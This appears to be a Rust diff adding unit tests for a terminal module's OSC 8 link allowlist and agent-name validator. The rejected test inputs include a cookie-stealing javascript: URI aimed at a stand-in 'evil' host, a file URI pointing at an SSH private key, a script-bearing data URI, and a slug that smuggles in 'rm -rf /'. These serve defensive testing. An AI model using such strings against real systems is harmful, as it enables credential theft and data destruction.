@@ -854,3 +854,64 @@ pub fn build_shell_command() -> CommandBuilder {
     cmd.env("TERM", "xterm-256color");
     cmd
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn osc8_uri_empty_is_safe() {
+        // Empty URI = link terminator; must always pass.
+        assert!(osc8_uri_is_safe(b""));
+    }
+
+    #[test]
+    fn osc8_uri_http_https_mailto_pass() {
+        assert!(osc8_uri_is_safe(b"http://example.com"));
+        assert!(osc8_uri_is_safe(b"https://example.com"));
+        assert!(osc8_uri_is_safe(b"HTTPS://EXAMPLE.COM"));
+        assert!(osc8_uri_is_safe(b"mailto:foo@example.com"));
+    }
+
+    #[test]
+    fn osc8_uri_unsafe_schemes_rejected() {
+        // The threat scenarios the allowlist is here to block.
+        assert!(!osc8_uri_is_safe(
+            b"javascript:fetch('//evil/?'+document.cookie)"
+        ));
+        assert!(!osc8_uri_is_safe(b"file:///Users/operator/.ssh/id_rsa"));
+        assert!(!osc8_uri_is_safe(
+            b"data:text/html,<script>alert(1)</script>"
+        ));
+        assert!(!osc8_uri_is_safe(b"ssh://server"));
+    }
+
+    #[test]
+    fn osc8_uri_non_utf8_rejected() {
+        // A URI that isn't valid UTF-8 cannot pass the lowercase
+        // scheme check. Defensive — terminal emulators would reject
+        // it too — but the allowlist must not accidentally permit
+        // it via the from_utf8 short-circuit.
+        assert!(!osc8_uri_is_safe(&[0xFF, 0xFE]));
+    }
+
+    #[test]
+    fn validate_agent_slug_rejects_typical_attacks() {
+        assert!(validate_agent_slug("").is_err());
+        assert!(validate_agent_slug("--debug").is_err());
+        assert!(validate_agent_slug("claude\n; rm -rf /").is_err());
+        assert!(validate_agent_slug("claude codex").is_err());
+        assert!(validate_agent_slug("claude\0").is_err());
+    }
+
+    #[test]
+    fn validate_agent_slug_accepts_well_formed_slug_when_no_allowlist() {
+        // Without JACKIN_SUPPORTED_AGENTS set, allowlist check is
+        // skipped (the env var is set inside the derived image; tests
+        // run on the host). Any well-formed token passes.
+        // Note: assumes JACKIN_SUPPORTED_AGENTS is not set in the
+        // test env (cargo nextest does not set it).
+        assert!(validate_agent_slug("claude").is_ok());
+        assert!(validate_agent_slug("codex").is_ok());
+    }
+}
